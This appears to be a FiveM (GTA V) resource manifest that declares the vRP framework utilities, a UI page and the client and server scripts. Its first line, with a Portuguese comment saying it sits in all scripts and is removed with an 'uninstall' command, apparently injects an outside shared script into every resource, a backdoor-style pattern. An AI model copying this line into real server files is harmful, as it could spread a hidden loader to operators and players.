shared_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'bodacious'
game 'gta5'

lua54 ''

ui_page 'ui/index.html'
shared_script { '@vrp/lib/utils.lua', "lib/*.lua", "config.lua" }
client_scripts { '@vrp/lib/utils.lua', 'client.lua' }
server_scripts { '@vrp/lib/utils.lua', 'server.lua' }              